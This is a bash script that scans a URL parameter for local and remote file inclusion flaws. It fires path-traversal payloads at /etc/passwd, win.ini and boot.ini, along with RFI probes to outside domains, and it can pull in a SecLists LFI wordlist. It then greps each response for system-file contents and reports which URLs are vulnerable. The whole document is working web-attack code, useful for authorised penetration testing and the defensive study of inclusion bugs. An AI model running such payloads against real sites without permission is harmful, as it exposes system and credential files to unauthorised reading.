#!/bin/bash

# Colors for pretty output
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

usage() {
    echo -e "${YELLOW}Usage: $0 -u <target_url> [-p <port>] [-f <payloads_file>] [-o <output_file>]${NC}"
    echo -e "  -u : Base URL with the parameter to test (e.g., 'http://example.com/page.php?file=')"
    echo -e "  -p : Non-standard port (optional, e.g., '8080')"
    echo -e "  -f : Path to a custom payloads file (optional)"
    echo -e "  -o : Path to save text results output (optional)"
    exit 1
}

# Ordered payloads array: RFI items placed strictly first
DEFAULT_PAYLOADS=(
    # --- RFI Payloads ---
    "http://evt9769kiw9769.com" # Dummy domain to look for in response or blind traffic
    "https://www.google.com"
    # --- LFI Payloads ---
    "../../../../../../../../etc/passwd"
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
    "/etc/passwd"
    "../../../../../../../../boot.ini"
    "../../../../../../../../windows/win.ini"
)

# Initialize an array data structure to store positive results
FINDINGS=()
OUTPUT_FILE=""

# Parse flags
while getopts "u:p:f:o:" opt; do
    case ${opt} in
        u ) URL=$OPTARG ;;
        p ) PORT=$OPTARG ;;
        f ) PAYLOAD_FILE=$OPTARG ;;
        o ) OUTPUT_FILE=$OPTARG ;;
        * ) usage ;;
    esac
done

if [ -z "$URL" ]; then
    usage
fi

# Handle non-standard port injection into URL
if [ ! -z "$PORT" ]; then
    URL=$(echo "$URL" | sed 's/\/$//')
    if [[ "$URL" =~ ^https?://[^/]+ ]]; then
        BASE_MATCH="${BASH_REMATCH[0]}"
        if [[ ! "$BASE_MATCH" =~ :[0-9]+$ ]]; then
            URL="${URL/${BASE_MATCH}/${BASE_MATCH}:${PORT}}"
        fi
    fi
fi

# Load payloads
SECLISTS_PATH="/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"

if [ ! -z "$PAYLOAD_FILE" ] && [ -f "$PAYLOAD_FILE" ]; then
    mapfile -t PAYLOADS < "$PAYLOAD_FILE"
elif [ -f "$SECLISTS_PATH" ]; then
    RFI_BASE=(
        "http://evt9769kiw9769.com"
        "https://www.google.com"
    )
    mapfile -t SECLISTS_CONTENT < <(grep -v '^\s*#' "$SECLISTS_PATH" | grep -v '^\s*$')
    PAYLOADS=("${RFI_BASE[@]}" "${SECLISTS_CONTENT[@]}")
else
    PAYLOADS=("${DEFAULT_PAYLOADS[@]}")
fi

echo -e "${GREEN}[+] Scanning target parameters silently...${NC}"

# Run the scan
for payload in "${PAYLOADS[@]}"; do
    TARGET_URL="${URL}${payload}"
    
    # Send request quietly
    RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" --connect-timeout 5 "$TARGET_URL")
    STATUS_CODE=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | awk -F':' '{print $2}')
    BODY=$(echo "$RESPONSE" | sed '/HTTP_STATUS:/d')

    # Analyze response and push matching strings directly into the FINDINGS data structure
    # 1. Linux LFI
    if echo "$BODY" | grep -qE "root:[x*!]:0:0|daemon:[x*!]:|nobody:[x*!]:"; then
        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found Linux system file content!\nURL: $TARGET_URL${NC}\n")
        
    # 2. Windows win.ini
    elif echo "$BODY" | grep -qiE "\[fonts\]|\[extensions\]|\[mci extensions\]"; then
        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found Windows win.ini content!\nURL: $TARGET_URL${NC}\n")

    # 3. Windows boot.ini
    elif echo "$BODY" | grep -qiE "\[boot loader\]|\[operating systems\]|multi\(0\)disk\(0\)"; then
        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found Windows boot.ini content!\nURL: $TARGET_URL${NC}\n")

    # 4. Hosts file leak
    elif echo "$BODY" | grep -qE "127\.0\.0\.1\s+localhost"; then
        FINDINGS+=("${RED}[!!!] VULNERABLE (LFI) -> Found hosts file content!\nURL: $TARGET_URL${NC}\n")
        
    # 5. RFI
    elif echo "$BODY" | grep -iq "<title>Google</title>" || echo "$BODY" | grep -q "google.com/brand-elements"; then
        FINDINGS+=("${RED}[!!!] VULNERABLE (RFI) -> Found Google landing page content!\nURL: $TARGET_URL${NC}\n")
        
    # 6. Fallback Status 200 OK
    elif [ "$STATUS_CODE" == "200" ]; then
        FINDINGS+=("${YELLOW}[?] Potential Hit -> Status 200 OK (Manual verification required)\nURL: $TARGET_URL${NC}\n")
    fi
done

# Output summary presentation at the end
echo -e "\n${GREEN}[+] Scan processing completed.${NC}"
echo -e "=================================================================\n"

if [ ${#FINDINGS[@]} -eq 0 ]; then
    echo -e "${YELLOW}[-] No positive findings or anomalies discovered.${NC}"
    if [ ! -z "$OUTPUT_FILE" ]; then
        echo -e "Scan target: $URL\nNo positive findings or anomalies discovered." > "$OUTPUT_FILE"
        echo -e "${GREEN}[+] Summary logged to $OUTPUT_FILE${NC}"
    fi
else
    echo -e "${GREEN}[+] Positive findings tracked during execution:${NC}\n"
    
    # Prepare output file headers if specified
    if [ ! -z "$OUTPUT_FILE" ]; then
        echo -e "Scan target: $URL\nPositive findings tracked during execution:\n" > "$OUTPUT_FILE"
    fi

    # Iterate through the captured data structure items
    for result in "${FINDINGS[@]}"; do
        # Print to terminal with colors
        echo -e "$result"
        
        # Write to file if option used (using sed to strip out shell color codes)
        if [ ! -z "$OUTPUT_FILE" ]; then
            echo -e "$result" | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" >> "$OUTPUT_FILE"
        fi
    done

    if [ ! -z "$OUTPUT_FILE" ]; then
        echo -e "${GREEN}[+] Clean text results saved to: $OUTPUT_FILE${NC}"
    fi
fi